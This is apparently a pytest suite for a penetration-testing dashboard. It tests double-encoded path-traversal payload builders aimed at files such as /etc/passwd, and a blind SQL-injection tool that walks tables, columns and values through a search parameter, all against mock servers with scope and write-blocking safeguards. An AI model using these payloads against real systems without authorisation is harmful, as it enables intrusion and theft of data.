"""도구 모듈 — 인코딩, 블라인드 추출 계산, 경로 조작·SQL 주입 도구, 도구 화면."""
import json
import sqlite3
from urllib.parse import parse_qs, unquote, urlsplit

import pytest

from dashboard import jobs, payloads
from dashboard.blind import Oracle, _to_char
from dashboard.core import Response, Target, ToolResult
from dashboard.db import get_db
from projects.sesacedu.modules import lecture_sqli, material_traversal

T = Target(1, "t", "https://sesacedu.store")
TREE = "srv\n└ sesacedu\n  └ api.env"


# ── 인코딩 ────────────────────────────────────────────────────

def test_double_full_matches_the_payload_that_worked():
    """11-03 실측 스크립트와 글자까지 같아야 한다 — 경로 구분자를 그대로 두는 쪽.

    실측 형태는 두 가지였다. 사용자가 쓴 스크립트는 `$PRE` + `etc/systemd/...` 처럼
    슬래시를 생짜로 두고, 다른 기록은 슬래시까지 %25%32%66 으로 감쌌다.
    디코딩 결과가 같아 양쪽 다 통한다. 여기서 맞추는 것은 **앞쪽 형태**다.
    """
    u = "%25%32%65%25%32%65%25%32%66"
    assert payloads.traversal("etc/passwd", 9, "double-full") == u * 9 + "etc/passwd"


@pytest.mark.parametrize("scheme, want", [
    ("none", "../../etc/passwd"),
    ("url", "%2e%2e%2f%2e%2e%2fetc/passwd"),
    ("double", "%252e%252e%252f%252e%252e%252fetc/passwd"),
    ("dots", "%2e%2e/%2e%2e/etc/passwd"),
])
def test_traversal_shapes(scheme, want):
    assert payloads.traversal("/etc/passwd", 2, scheme) == want


def test_each_encoding_decodes_back_to_traversal():
    for scheme in payloads.ENCODINGS:
        once = unquote(payloads.traversal("etc/passwd", 1, scheme))
        assert "../" in once or "../" in unquote(once), scheme


@pytest.mark.parametrize("sql", ["DELETE FROM users", "SELECT 1; DROP TABLE users", "UPDATE t SET a=1"])
def test_only_select_allowed(sql):
    with pytest.raises(ValueError):
        payloads.ensure_select_only(sql)


def test_select_passes():
    assert payloads.ensure_select_only("SELECT mail FROM members ;") == "SELECT mail FROM members"


def test_to_char_handles_utf8_bytes_and_codepoints():
    assert _to_char(ord("a")) == "a"
    assert _to_char(0xED858C, as_bytes=True) == "테"     # Oracle ASCII() 가 주는 바이트 묶음
    assert _to_char(ord("테"), as_bytes=False) == "테"    # UNICODE() 가 주는 글자 번호
    # 같은 숫자라도 DB 제품에 따라 다르게 읽어야 한다
    assert _to_char(0xD14C, as_bytes=True) != _to_char(0xD14C, as_bytes=False)


# ── 블라인드 추출 계산(진짜 DB 로) ────────────────────────────

@pytest.fixture
def sqlite_oracle():
    """sqlite 를 '참·거짓만 알려 주는 상대'로 두고 추출 계산을 그대로 시험한다."""
    db = sqlite3.connect(":memory:")
    db.executescript("CREATE TABLE members (mail TEXT, uname TEXT);"
                     "INSERT INTO members VALUES ('demo@example.test', '연습계정');")
    asked = []

    def ask(cond):
        asked.append(cond)
        return bool(db.execute(f"SELECT CASE WHEN ({cond}) THEN 1 ELSE 0 END").fetchone()[0])

    return Oracle(ask, dbms="sqlite"), asked


def test_reads_number_and_text(sqlite_oracle):
    ora, _ = sqlite_oracle
    assert ora.read_number("SELECT COUNT(*) FROM members") == 1
    assert ora.read_text("SELECT mail FROM members") == "demo@example.test"


def test_reads_korean_text(sqlite_oracle):
    ora, _ = sqlite_oracle
    assert ora.read_text("SELECT uname FROM members", charset="text") == "연습계정"


def test_cache_skips_second_read(sqlite_oracle):
    ora, asked = sqlite_oracle
    ora.read_text("SELECT mail FROM members")
    first = len(asked)
    assert ora.read_text("SELECT mail FROM members") == "demo@example.test"
    assert len(asked) == first and ora.cached_hits == 1


def test_reads_table_list(sqlite_oracle):
    ora, _ = sqlite_oracle
    assert ora.read_list(payloads.DBMS["sqlite"]["tables"], limit=3, charset="ident") == ["members"]


# ── 가짜 새싹에듀(연습용 대상과 같은 모양) ────────────────────

def fake_lectures_fetch(record=None):
    """keyword 를 SQL 에 그대로 이어 붙이는 서버. 연습용 대상과 같은 동작."""
    # 도구는 작업자 스레드에서 돈다 — 만든 스레드 밖에서도 쓰게 둔다
    db = sqlite3.connect(":memory:", check_same_thread=False)
    db.executescript("CREATE TABLE lectures (id INTEGER, title TEXT, is_open INTEGER);"
                     "CREATE TABLE members (id INTEGER, mail TEXT);"
                     "INSERT INTO members VALUES (1, 'demo@example.test');")
    # 실제 서버처럼 조건이 하나 더 있다. 그래서 OR 를 끼우면 그 조건이 무력해져 건수가 달라진다.
    db.executemany("INSERT INTO lectures VALUES (?, ?, ?)",
                   [(i, f"강의 {i}", 1 if i <= 35 else 0) for i in range(1, 42)])

    def fetch(url, **_kw):
        keyword = parse_qs(urlsplit(url).query).get("keyword", [""])[0]
        if record is not None:
            record.append(keyword)
        try:
            total = db.execute(f"SELECT COUNT(*) FROM lectures "
                               f"WHERE is_open = 1 AND title LIKE '%{keyword}%'").fetchone()[0]
        except sqlite3.Error as e:
            return Response(url, 500, [], json.dumps({"error": str(e)}))
        return Response(url, 200, [], json.dumps({"page": {"total": total}}))
    return fetch


def test_sqli_probe_reports_injection(monkeypatch):
    sent = []
    monkeypatch.setattr(lecture_sqli, "fetch", fake_lectures_fetch(sent))
    r = lecture_sqli.run(T, {"mode": "probe", "dbms": "sqlite", "limit": "5", "offset": "0"})
    assert "주입됩니다" in r.summary and len(sent) == 2
    assert r.findings[0].severity == "critical"
    assert r.rows[0][1] != r.rows[1][1]          # 참·거짓 건수가 다르다


def test_sqli_walks_tables_then_columns_then_values(monkeypatch):
    monkeypatch.setattr(lecture_sqli, "fetch", fake_lectures_fetch())
    base = {"dbms": "sqlite", "limit": "5", "offset": "0", "table": "", "column": "", "sql": ""}

    tables = lecture_sqli.run(T, {**base, "mode": "tables"})
    assert [r[0] for r in tables.rows] == ["lectures", "members"]

    drill = tables.drills[1]["컬럼 보기"]           # members 행의 '컬럼 보기'
    assert drill["table"] == "members"
    columns = lecture_sqli.run(T, {**base, **drill})
    assert [r[0] for r in columns.rows] == ["id", "mail"]

    values = lecture_sqli.run(T, {**base, **columns.drills[1]["값 보기"]})
    assert values.rows[0][1] == "demo@example.test"


def test_sqli_blocks_writes(monkeypatch):
    monkeypatch.setattr(lecture_sqli, "fetch", fake_lectures_fetch())
    with pytest.raises(ValueError):
        lecture_sqli.run(T, {"mode": "sql", "sql": "DELETE FROM members", "dbms": "sqlite",
                             "limit": "1", "offset": "0", "table": "", "column": ""})


def test_sqli_stops_when_not_injectable(monkeypatch):
    monkeypatch.setattr(lecture_sqli, "fetch",
                        lambda url, **k: Response(url, 200, [], json.dumps({"page": {"total": 41}})))
    with pytest.raises(RuntimeError, match="같습니다"):
        lecture_sqli.run(T, {"mode": "tables", "dbms": "sqlite", "limit": "5", "offset": "0",
                             "table": "", "column": "", "sql": ""})


# ── 경로 조작 도구 ────────────────────────────────────────────

def fake_download_fetch():
    """'../ 제거 뒤 디코딩' 순서를 그대로 흉내 낸 서버."""
    files = {"etc/passwd": "root:x:0:0:root:/root:/bin/bash\n"}

    def fetch(url, **_kw):
        raw = parse_qs(urlsplit(url).query).get("file", [""])[0]   # 들어올 때 이미 1번 디코딩
        decoded = unquote(raw.replace("../", ""))                  # ../ 를 먼저 지우고 그다음 디코딩
        if "../" in decoded and decoded.replace("../", "") in files:
            return Response(url, 200, [], files[decoded.replace("../", "")])
        return Response(url, 404, [], "not found")
    return fetch


def test_traversal_tool_finds_readable_file(monkeypatch):
    monkeypatch.setattr(material_traversal, "fetch", fake_download_fetch())
    r = material_traversal.run(T, {"paths": "etc/passwd\netc/shadow", "scheme": "double-full",
                                   "depth": "9", "lecture": "123"})
    assert r.rows[0][3] == "읽힘" and r.rows[1][3] == "없음/차단"
    assert r.drills[0] == {"내용 보기": {"paths": "etc/passwd"}} and r.drills[1] is None
    assert r.findings[0].severity == "high"


def test_traversal_tool_shows_content_for_single_path(monkeypatch):
    monkeypatch.setattr(material_traversal, "fetch", fake_download_fetch())
    r = material_traversal.run(T, {"paths": "etc/passwd", "scheme": "double-full",
                                   "depth": "9", "lecture": "123"})
    assert "root:x:0:0" in r.text


def test_traversal_tool_plain_scheme_is_blocked(monkeypatch):
    monkeypatch.setattr(material_traversal, "fetch", fake_download_fetch())
    r = material_traversal.run(T, {"paths": "etc/passwd", "scheme": "none", "depth": "9", "lecture": "123"})
    assert r.findings == [] and r.rows[0][1] == 404


def test_traversal_tool_limits_paths(monkeypatch):
    monkeypatch.setattr(material_traversal, "fetch", fake_download_fetch())
    with pytest.raises(ValueError, match="40개까지"):
        material_traversal.run(T, {"paths": "\n".join(f"a{i}" for i in range(41)),
                                   "scheme": "none", "depth": "9", "lecture": "123"})


# ── 도구 화면 ─────────────────────────────────────────────────

@pytest.fixture
def tool_client(app, client, monkeypatch):
    client.post("/targets", data={"project": "sesacedu", "role": "user_web", "name": "웹", "url": "https://sesacedu.store"})
    monkeypatch.setattr(lecture_sqli, "fetch", fake_lectures_fetch())
    return client


def test_tools_page_lists_tools(tool_client):
    page = tool_client.get("/tools").get_data(as_text=True)
    assert "강의 목록 SQL 주입" in page and "자료 다운로드 경로 조작" in page


def test_tool_run_and_drill(app, tool_client):
    form = {"target_id": 1, "module_id": "sesacedu_lecture_sqli", "confirm": "yes", "mode": "tables",
            "dbms": "sqlite", "limit": "5", "offset": "0", "table": "", "column": "", "sql": ""}
    page = tool_client.post("/tools/run", data=form, follow_redirects=True).get_data(as_text=True)
    assert "members" in page and "컬럼 보기" in page

    # 표의 '컬럼 보기'를 누른 것과 같은 요청
    drill = json.dumps({"mode": "columns", "table": "members", "offset": "0"})
    page = tool_client.post("/tools/run", data={**form, "_drill": drill}, follow_redirects=True).get_data(as_text=True)
    assert "mail" in page and "members — 컬럼" in page


def test_tool_needs_confirm(app, tool_client):
    page = tool_client.post("/tools/run", data={
        "target_id": 1, "module_id": "sesacedu_lecture_sqli", "mode": "probe", "dbms": "sqlite",
        "limit": "5", "offset": "0", "table": "", "column": "", "sql": ""}, follow_redirects=True).get_data(as_text=True)
    assert "체크해야" in page


def test_tool_rejects_bad_select_option(app, tool_client):
    page = tool_client.post("/tools/run", data={
        "target_id": 1, "module_id": "sesacedu_lecture_sqli", "confirm": "yes", "mode": "nope",
        "dbms": "sqlite", "limit": "5", "offset": "0", "table": "", "column": "", "sql": ""},
        follow_redirects=True).get_data(as_text=True)
    assert "목록에 있는 값" in page


def test_tool_cache_persists_between_runs(app, tool_client):
    form = {"target_id": 1, "module_id": "sesacedu_lecture_sqli", "confirm": "yes", "mode": "tables",
            "dbms": "sqlite", "limit": "5", "offset": "0", "table": "", "column": "", "sql": ""}
    tool_client.post("/tools/run", data=form)
    with app.app_context():
        saved = get_db().execute("SELECT COUNT(*) c FROM tool_cache").fetchone()["c"]
    assert saved > 0
    page = tool_client.post("/tools/run", data=form, follow_redirects=True).get_data(as_text=True)
    assert "기억해 둔 값" in page


def test_tool_module_runs_from_modules_tab(app, tool_client):
    """모듈 탭에서 누르면 그 자리에서 뒤로 돈다 — 도구 탭으로 넘기지 않는다(11-07 안 1)."""
    form = {k: v for k, v in RUN_FORM.items() if k != "module_id"}
    r = tool_client.post("/modules/sesacedu_lecture_sqli/run", data=form)
    assert r.status_code == 302 and "/modules" in r.headers["Location"]
    with app.app_context():
        run = get_db().execute("SELECT * FROM runs WHERE module_id = 'sesacedu_lecture_sqli'").fetchone()
    assert run["status"] == "done" and "members" in run["result"]
    # 끝난 도구에는 결과 표로 가는 주소가 붙는다
    row = tool_client.get("/jobs?target=1").get_json()["jobs"][0]
    assert row["result_url"].endswith(f"run={run['id']}")
    page = tool_client.get(row["result_url"]).get_data(as_text=True)
    assert "members" in page and "컬럼 보기" in page


def test_tool_module_from_modules_tab_still_needs_confirm(app, tool_client):
    form = {k: v for k, v in RUN_FORM.items() if k not in ("module_id", "confirm")}
    page = tool_client.post("/modules/sesacedu_lecture_sqli/run", data=form,
                            follow_redirects=True).get_data(as_text=True)
    assert "체크해야" in page
    with app.app_context():
        assert get_db().execute("SELECT COUNT(*) c FROM runs").fetchone()["c"] == 0


def test_tool_result_type_checked(app, tool_client, monkeypatch):
    mod = app.config["MODULES"]["sesacedu_lecture_sqli"]
    monkeypatch.setattr(mod, "run", lambda *a, **k: "틀린 반환값")
    page = tool_client.post("/tools/run", data={
        "target_id": 1, "module_id": "sesacedu_lecture_sqli", "confirm": "yes", "mode": "probe",
        "dbms": "sqlite", "limit": "5", "offset": "0", "table": "", "column": "", "sql": ""},
        follow_redirects=True).get_data(as_text=True)
    assert "ToolResult" in page
    assert isinstance(ToolResult(), ToolResult)


# ── 역할(같은 프로젝트 안의 서버 구분) ────────────────────────

def add_target(client, name, url, role, project="sesacedu"):
    return client.post("/targets", data={"project": project, "role": role, "name": name, "url": url},
                       follow_redirects=True).get_data(as_text=True)


def test_role_required_when_project_has_roles(client):
    assert "점검 대상을 골라" in add_target(client, "웹", "https://sesacedu.store", "")
    assert "점검 대상을 골라" in add_target(client, "웹", "https://sesacedu.store", "없는역할")
    assert "등록했습니다" in add_target(client, "웹", "https://sesacedu.store", "user_web")


def test_modules_filtered_by_role(app, client):
    add_target(client, "사용자 웹", "https://sesacedu.store", "user_web")
    add_target(client, "관리자 웹", "http://localhost:3000", "admin_web")
    with app.app_context():
        ids = {r["role"]: r["id"] for r in get_db().execute("SELECT id, role FROM targets")}

    web = client.get(f"/tools?target={ids['user_web']}").get_data(as_text=True)
    assert "강의 목록 SQL 주입" in web

    admin = client.get(f"/tools?target={ids['admin_web']}").get_data(as_text=True)
    assert "강의 목록 SQL 주입" not in admin      # 사용자 웹·연습용 전용이라 숨는다
    assert "서버 명령 출력 읽기" in admin          # 역할을 가리지 않는 모듈은 보인다

    page = client.post("/tools/run", data={
        "target_id": ids["admin_web"], "module_id": "sesacedu_lecture_sqli", "confirm": "yes", "mode": "probe",
        "dbms": "oracle", "limit": "5", "offset": "0", "table": "", "column": "", "sql": ""})
    assert page.status_code == 404                # 숨은 모듈은 돌릴 수도 없다


def test_role_shown_in_report(app, client):
    add_target(client, "관리자 웹", "http://localhost:3000", "admin_web")
    with app.app_context():
        tid = get_db().execute("SELECT id FROM targets").fetchone()["id"]
    md = client.get(f"/report/{tid}.md").get_data(as_text=True)
    assert "관리자 웹 (EC2 ②, admin.sesacedu.store)" in md   # 주소만으론 어디인지 모른다
    assert json.loads(client.get(f"/report/{tid}.json").get_data(as_text=True))["target"]["role"]


# ── 서버 명령 출력 읽기 ───────────────────────────────────────

SS = ('$ sudo --version\nSudo version 1.9.15p5\n\n$ ss -tlnp\n'
      'LISTEN 0 4096 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=1,fd=3))\n'
      'LISTEN 0 4096 0.0.0.0:8080 0.0.0.0:* users:(("java",pid=2,fd=4))\n'
      'LISTEN 0 4096 127.0.0.1:3000 0.0.0.0:* users:(("node",pid=3,fd=5))\n')


def test_host_report_reads_version_and_ports():
    from modules import host_report
    r = host_report.run(Target(1, "EC2 ①", "https://sesacedu.store"),
                        {"output": SS, "fixed": "sudo 1.9.17", "public_ports": "22,80,443"})
    titles = [f.title for f in r.findings]
    assert any("sudo 1.9.15" in t and "낮음" in t for t in titles)
    assert any("8080" in t for t in titles)
    assert not any("3000" in t for t in titles)   # 127.0.0.1 로만 듣는 것은 표시하지 않는다
    assert not any(":22" in t for t in titles)    # 허용 목록에 있는 포트도 표시하지 않는다


def test_host_report_sends_nothing(monkeypatch):
    from dashboard import core
    from modules import host_report
    monkeypatch.setattr(core, "fetch", lambda *a, **k: pytest.fail("요청을 보내면 안 된다"))
    host_report.run(Target(1, "t", "https://sesacedu.store"),
                    {"output": SS, "fixed": "sudo 1.9.17", "public_ports": "22"})


def test_host_report_needs_input():
    from modules import host_report
    with pytest.raises(ValueError):
        host_report.run(Target(1, "t", "https://x.test"), {"output": "", "fixed": "", "public_ports": ""})


# ── 역할이 포트까지 묶는다 ────────────────────────────────────

@pytest.mark.parametrize("url, role, ok", [
    ("http://localhost:3000/admin", "admin_web", True),
    ("http://127.0.0.1:3000/admin", "admin_web", True),
    ("http://localhost:5051/", "admin_web", False),     # 같은 호스트, 다른 서버(연습용)
    ("http://localhost:8443/", "admin_web", False),
    ("http://localhost:5051/", "practice", True),
    ("http://localhost:3000/", "practice", False),
    ("https://sesacedu.store/", "user_web", True),
    ("http://localhost:3000/", "user_web", False),      # 사용자 웹 역할로 터널에 못 간다
])
def test_role_scope_pins_the_port(app, url, role, ok):
    from dashboard import scope
    project = app.config["PROJECTS"]["sesacedu"]
    assert scope.is_in_scope(url, project.role_scope(role)) is ok


def test_bare_host_entry_allows_any_port():
    from dashboard import scope
    # 포트를 안 적은 줄은 포트를 가리지 않는다
    assert scope.is_in_scope("https://sesacedu.store:8443/", ["sesacedu.store"])
    assert scope.is_in_scope("https://a.sesacedu.store/", ["sesacedu.store"])
    # 포트를 적은 줄은 그 포트만. 아래 글은 생략된 443 이라 통과한다
    assert scope.is_in_scope("https://sesacedu.store/", ["sesacedu.store:443"])
    assert not scope.is_in_scope("https://sesacedu.store:8443/", ["sesacedu.store:443"])


def test_registering_target_checks_role_port(client):
    assert "허용 범위 밖" in add_target(client, "관리자", "http://localhost:8443", "admin_web")
    assert "등록했습니다" in add_target(client, "관리자", "http://localhost:3000", "admin_web")


def test_module_cannot_reach_other_tunnel_port(app, client, monkeypatch):
    """관리자 웹 대상으로 돌린 모듈이 같은 호스트의 다른 포트로 나가려 하면 막힌다."""
    from dashboard import core
    from modules import http_security_headers
    add_target(client, "관리자", "http://localhost:3000", "admin_web")
    monkeypatch.setattr(http_security_headers, "fetch", lambda url, **k: core.fetch("http://localhost:5051/"))
    with app.app_context():
        tid = get_db().execute("SELECT id FROM targets").fetchone()["id"]
    page = client.post("/modules/http_security_headers/run", data={"target_id": tid, "path": "/"},
                       follow_redirects=True).get_data(as_text=True)
    assert "허용 범위 밖" in page and "5051" in page


# ── 포트 확인: HTTP 가 아닌 길은 따로 검사한다 ────────────────

def test_port_check_uses_host_scope_not_role_port(app, client, monkeypatch):
    """역할이 3000 으로 묶여 있어도 포트 확인은 다른 포트를 볼 수 있어야 한다."""
    from dashboard import core
    from modules import port_check
    tried = []
    monkeypatch.setattr(core, "tcp_check", lambda h, p, t=2.0: tried.append((h, p)) or
                        ("open" if p in (22, 8080) else "closed"))
    monkeypatch.setattr(port_check, "tcp_check", core.tcp_check)
    add_target(client, "관리자", "http://localhost:3000", "admin_web")
    with app.app_context():
        tid = get_db().execute("SELECT id FROM targets").fetchone()["id"]
    page = client.post("/tools/run", data={
        "target_id": tid, "module_id": "port_check", "confirm": "yes",
        "ports": "22,443,8080", "expected": "443", "timeout": "1"}, follow_redirects=True).get_data(as_text=True)
    assert tried == [("localhost", 22), ("localhost", 443), ("localhost", 8080)]
    assert "예상 밖 2개" in page


def test_tcp_blocked_outside_project_hosts(app):
    from dashboard import core, scope
    from flask import g
    with app.test_request_context():
        g.host_scope = ["sesacedu.store", "localhost"]
        with pytest.raises(scope.OutOfScope):
            core.tcp_check("example.com", 80)


def test_tcp_records_in_history(app, client, monkeypatch):
    import socket
    from modules import port_check
    monkeypatch.setattr(socket, "create_connection", lambda *a, **k: pytest.fail("열지 않는다")
                        if a[0][1] != 22 else _FakeSock())
    add_target(client, "웹", "https://sesacedu.store", "user_web")
    with app.app_context():
        tid = get_db().execute("SELECT id FROM targets").fetchone()["id"]
    client.post("/tools/run", data={"target_id": tid, "module_id": "port_check", "confirm": "yes",
                                    "ports": "22", "expected": "22", "timeout": "1"})
    with app.app_context():
        x = get_db().execute("SELECT method, url, resp_body FROM exchanges WHERE method = 'TCP'").fetchone()
    assert x["url"] == "tcp://sesacedu.store:22" and x["resp_body"] == "open"


class _FakeSock:
    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


def test_port_check_rejects_bad_input(app, client):
    add_target(client, "웹", "https://sesacedu.store", "user_web")
    with app.app_context():
        tid = get_db().execute("SELECT id FROM targets").fetchone()["id"]
    page = client.post("/tools/run", data={"target_id": tid, "module_id": "port_check", "confirm": "yes",
                                           "ports": "22,abc", "expected": "", "timeout": "1"},
                       follow_redirects=True).get_data(as_text=True)
    assert "포트가 아닌 값" in page
    page = client.post("/tools/run", data={
        "target_id": tid, "module_id": "port_check", "confirm": "yes",
        "ports": ",".join(str(p) for p in range(1, 40)), "expected": "", "timeout": "1"},
        follow_redirects=True).get_data(as_text=True)
    assert "30개까지" in page


# ── '이어서 보기' 버튼이 화면에서 실제로 눌리는가 ────────────────────
# tojson 은 Markup 을 돌려줘 자동 이스케이프를 건너뛴다. HTML 속성 안에 그대로
# 넣으면 값의 첫 " 가 속성을 끊어 버려 value 가 '{"' 로 잘린다.
# 서버는 그 조각을 json 으로 못 읽고 400 Bad Request 를 낸다.

def _drill_values(html):
    import re
    return re.findall(r'name="_drill" value="([^"]*)"', html)


def test_drill_button_value_is_valid_json(app, tool_client):
    form = {"target_id": 1, "module_id": "sesacedu_lecture_sqli", "confirm": "yes", "mode": "tables",
            "dbms": "sqlite", "limit": "5", "offset": "0", "table": "", "column": "", "sql": ""}
    html = tool_client.post("/tools/run", data=form, follow_redirects=True).get_data(as_text=True)
    values = _drill_values(html)
    assert values, "이어서 보기 버튼이 없다"
    for raw in values:
        import html as _h
        parsed = json.loads(_h.unescape(raw))        # 브라우저가 보내는 것과 같은 값
        assert isinstance(parsed, dict) and parsed, f"잘린 값: {raw!r}"


def test_clicking_drill_button_works_end_to_end(app, tool_client):
    """화면에 찍힌 값을 그대로 되돌려 보내도 400 이 나면 안 된다."""
    import html as _h
    form = {"target_id": 1, "module_id": "sesacedu_lecture_sqli", "confirm": "yes", "mode": "tables",
            "dbms": "sqlite", "limit": "5", "offset": "0", "table": "", "column": "", "sql": ""}
    html = tool_client.post("/tools/run", data=form, follow_redirects=True).get_data(as_text=True)
    raw = _drill_values(html)[0]
    r = tool_client.post("/tools/run", data={**form, "_drill": _h.unescape(raw)}, follow_redirects=True)
    assert r.status_code == 200 and "lectures — 컬럼" in r.get_data(as_text=True)


# ── 쿼리스트링에서 뜻이 달라지는 글자 ────────────────────────────
# 경로에 '+' 가 있으면 서버가 공백으로 읽어 **있는 파일이 404 로 돌아온다.**
# 모의해킹 세션이 11-04 실서버에서 /opt/java/jdk-11.0.24+8 로 확인했다.

def test_plus_in_a_path_is_wrapped():
    got = payloads.traversal("opt/java/jdk-11.0.24+8", 1, "double-full")
    assert "+" not in got, "'+' 를 그대로 보내면 서버가 공백으로 읽는다"
    assert got.endswith("opt/java/jdk-11.0.24%25%32%628")


@pytest.mark.parametrize("ch", list(payloads.UNSAFE_IN_QUERY))
def test_every_unsafe_char_is_wrapped(ch):
    got = payloads.traversal(f"a{ch}b", 0, "url")
    assert got == "a" + payloads._pct(ch) + "b"
    if ch != "%":          # % 는 감싸면 %25 라 자기 자신이 남는다
        assert ch not in got


def test_ordinary_characters_are_left_alone():
    """슬래시·점·글자는 그대로 둔다 — 실측 스크립트가 그 형태다."""
    assert payloads.traversal("etc/systemd/system/x.service", 0, "double-full")         == "etc/systemd/system/x.service"


@pytest.mark.parametrize("scheme", ["none", "dots"])
def test_unwrapped_schemes_do_not_touch_the_path(scheme):
    """감싸지 않는 방식은 경로도 건드리지 않는다 — 사람이 적은 그대로 보낸다."""
    assert payloads.traversal("a+b", 0, scheme) == "a+b"


def test_wrapping_depth_matches_the_dots():
    """경로를 감싸는 겹수는 ../ 와 같아야 한다.

    서버가 '../ 제거 → 디코딩' 순서라, 한 겹만 감싸면 제거 단계에서 이미 풀려
    경로가 어긋난다.
    """
    one = payloads.traversal("a+b", 0, "url")
    two = payloads.traversal("a+b", 0, "double-full")
    assert one == "a%2bb"
    assert two == "a%25%32%62b"


# ── 도구 실행도 '도는 중' 에 올라간다 ──────────────────────────
# 도구도 다른 모듈처럼 뒤에서 돈다(11-07 안 1). 멈춤·요청 흐름·동시 실행 상한이
# 같이 따라오고, 결과 표는 끝난 뒤 도구 탭(?run=)에서 다시 연다.

RUN_FORM = {"target_id": 1, "module_id": "sesacedu_lecture_sqli", "confirm": "yes", "mode": "tables",
            "dbms": "sqlite", "limit": "5", "offset": "0", "table": "", "column": "", "sql": ""}


def test_tool_run_is_live_in_the_drawer_while_it_runs(app, tool_client, monkeypatch):
    """도는 동안 서랍에 보이고, 다른 탭에서 연 도구 화면도 그렇다고 적는다."""
    seen = {}

    def peek(target, params):
        seen["live"] = jobs.live_count()
        seen["rows"] = jobs.listing()
        seen["json"] = app.test_client().get("/jobs?target=1").get_json()
        # 다른 탭에서 도구 화면을 다시 연 것과 같다 — 결과 자리는 비어 있다
        seen["page"] = app.test_client().get("/tools?target=1").get_data(as_text=True)
        return ToolResult(summary="들여다봤다")

    monkeypatch.setattr(app.config["MODULES"]["sesacedu_lecture_sqli"], "run", peek)
    tool_client.post("/tools/run", data=RUN_FORM)

    assert seen["live"] == 1
    assert seen["rows"][0]["module_id"] == "sesacedu_lecture_sqli" and seen["rows"][0]["live"]
    assert seen["json"]["live"] == 1
    assert "이 돌고 있습니다" in seen["page"]


def test_tool_run_leaves_the_drawer_when_it_ends(app, tool_client, monkeypatch):
    """끝나면 도는 수는 0 으로 돌아가고 기록과 결과 문구는 남는다."""
    monkeypatch.setattr(app.config["MODULES"]["sesacedu_lecture_sqli"], "run",
                        lambda t_, p_: ToolResult(summary="표 2개"))
    tool_client.post("/tools/run", data=RUN_FORM)

    rows = jobs.listing()
    assert jobs.live_count() == 0
    assert rows[0]["status"] == "done" and rows[0]["message"].startswith("표 2개")


def test_tool_run_can_be_stopped_from_the_drawer(app, tool_client, monkeypatch):
    """멈춤을 누르면 다음 요청을 보내기 직전에 걸린다. 전에는 stop_check 가 없어 못 멈췄다."""
    from flask import g

    def long(target, params):
        run_id = jobs.listing()[0]["run_id"]
        assert app.test_client().post(f"/jobs/{run_id}/cancel").get_json()["ok"]
        g.run_ctx.before_send()        # core.fetch 가 보내기 직전에 부르는 바로 그 자리
        raise AssertionError("여기까지 오면 안 멈춘 것이다")

    monkeypatch.setattr(app.config["MODULES"]["sesacedu_lecture_sqli"], "run", long)
    page = tool_client.post("/tools/run", data=RUN_FORM, follow_redirects=True).get_data(as_text=True)

    assert "멈췄습니다" in page
    assert jobs.listing()[0]["status"] == "cancelled" and jobs.live_count() == 0


def test_tool_run_waits_its_turn_when_the_limit_is_full(app, tool_client, monkeypatch):
    """동시 실행 상한은 도구에도 같이 건다 — 요청 간격을 지켜도 동시에 때리면 합쳐진 양이 는다."""
    monkeypatch.setattr(jobs, "MAX_LIVE", 0)
    ran = []
    monkeypatch.setattr(app.config["MODULES"]["sesacedu_lecture_sqli"], "run",
                        lambda t_, p_: ran.append(1) or ToolResult(summary="돌았다"))
    page = tool_client.post("/tools/run", data=RUN_FORM, follow_redirects=True).get_data(as_text=True)

    assert ran == [] and "하나가 끝나면" in page


def test_tool_text_is_written_to_a_file(app, tool_client, monkeypatch, tmp_path):
    """퍼징 트리는 파일로도 남는다 — 보고서에 붙이고 팀에 넘기는 산출물이다.

    화면 복원은 `runs.result` 로 된다(#71). 그것과 별개로 **받아 쓰는 사람이 sqlite 를
    열지 않고 꺼낼 수 있어야** 한다(사용자 지적 11-07). 파일만 떼어 가도 뜻이 통하게
    모듈·대상·시각을 머리말로 적는다.
    """
    app.config["RUNS_DIR"] = str(tmp_path / "runs")
    monkeypatch.setattr(app.config["MODULES"]["sesacedu_lecture_sqli"], "run",
                        lambda t_, p_: ToolResult(summary="표 2개", text=TREE))

    tool_client.post("/tools/run", data=RUN_FORM)

    files = list((tmp_path / "runs").glob("*/*/[0-9]*.txt"))
    assert len(files) == 1
    body = files[0].read_text(encoding="utf-8")
    assert "api.env" in body and "https://sesacedu.store" in body and "실행 #" in body
    # 어디에 적혔는지 화면에도 알려 준다 — 모르면 가져다 쓰지 못한다
    page = tool_client.get("/tools?target=1&tool=sesacedu_lecture_sqli").get_data(as_text=True)
    assert "파일로도 남겼습니다" in page and files[0].name in page


def test_each_run_gets_its_own_file(app, tool_client, monkeypatch, tmp_path):
    """실행마다 따로 남아야 지난 지도와 비교할 수 있다. 덮어쓰면 비교가 없어진다."""
    app.config["RUNS_DIR"] = str(tmp_path / "runs")
    texts = iter(["첫 번째 지도", "두 번째 지도"])
    monkeypatch.setattr(app.config["MODULES"]["sesacedu_lecture_sqli"], "run",
                        lambda t_, p_: ToolResult(summary="표", text=next(texts)))
    tool_client.post("/tools/run", data=RUN_FORM)
    tool_client.post("/tools/run", data=RUN_FORM)

    files = sorted((tmp_path / "runs").glob("*/*/[0-9]*.txt"))
    assert [f.stem for f in files] == ["0001", "0002"]
    assert "첫 번째 지도" in files[0].read_text(encoding="utf-8")
    assert "두 번째 지도" in files[1].read_text(encoding="utf-8")


def test_text_file_is_not_written_when_there_is_nothing_to_write(app, tool_client, monkeypatch, tmp_path):
    """본문 없는 도구까지 빈 파일을 쌓으면 폴더가 색인 구실을 못 한다."""
    app.config["RUNS_DIR"] = str(tmp_path / "runs")
    monkeypatch.setattr(app.config["MODULES"]["sesacedu_lecture_sqli"], "run",
                        lambda t_, p_: ToolResult(summary="표만 있다"))
    tool_client.post("/tools/run", data=RUN_FORM)
    assert list((tmp_path / "runs").rglob("*.txt")) == []
